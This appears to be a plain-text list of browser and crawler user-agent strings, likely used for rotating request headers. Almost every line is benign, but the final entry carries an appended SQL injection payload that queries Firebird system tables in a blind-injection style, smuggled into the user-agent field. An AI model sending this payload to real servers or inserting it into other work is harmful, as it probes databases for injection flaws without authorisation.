Mozilla/5.0 (Linux; Android 8.1.0; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1; CASPER_VIA_M1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; F3311) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-D693TR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; MI 8 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; ASUS_Z012S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.112 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J400F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/78.0.257670029 Mobile/16F203 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-J500F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.76 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 8.1.0; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; LG-H960) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-A710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; SM-A710F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.1.1; Moto E (4) Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; MI 8 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; tr-tr; SAMSUNG SM-T230 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; RNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.2 Chrome/51.0.2704.106 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/78.0.257670029 Mobile/16F203 Safari/604.1
Mozilla/5.0 (Linux; Android 8.0.0; SM-C9000 Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-D693TR Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.1.2; tr-tr; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Mozilla/5.0 (Linux; Android 7.0; SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-C9000 Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; Venus_V3_5570) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 6.0.1; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 7.0; F3111) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A720F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-E500H Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; SM-G611F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; HUAWEI RIO-L01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.2; tr-tr; SM-G313HY Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Mozilla/5.0 (Linux; Android 5.1.1; SM-J500F Build/LMY48B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 5.1.1; LG-H960) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; Venus_V3_5580 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H525) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; HTC One M9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; LG-D693TR) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; GM6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36 
Mozilla/5.0 (Linux; Android 8.1.0; SM-J410F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0.1; SM-N910C Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-J500FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; GT-I9195I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; Casper_VIA_V10 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1
Mozilla/5.0 (Linux; Android 9; SNE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 7.0; SM-G920F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; LG-H960) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 6.0; LG-H815 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36"
Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.792.0 Safari/535.1
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.872.0 Safari/535.2
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7
Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24
Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36
Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1467.0 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.38 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9
Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12D508 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/42.0 Safari/537.31
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10
Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) LinkCheck by Siteimprove.com
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (BB10; Touch) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.2.2339 Mobile Safari/537.35+
Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 525) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 5.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) QuickLook/5.0
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Linux; U; Android 4.3; en-us; ZTE-Z667G Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.2.155 Chrome/44.2.2403.155 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Mobile; rv:32.0) Gecko/32.0 Firefox/32.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/7.0)
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2483.0 Safari/537.36
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0 Cyberfox/40.0
Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Mercury/8.7 Mobile/11B554a Safari/9537.53
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.0.19) Gecko/2010062819 Firefox/3.0.19 Flock/2.6.1
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25
Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0,gzip(gfe)
Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17'||(SELECT EPjC WHERE 7531=7531 OR 2697=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4))||'
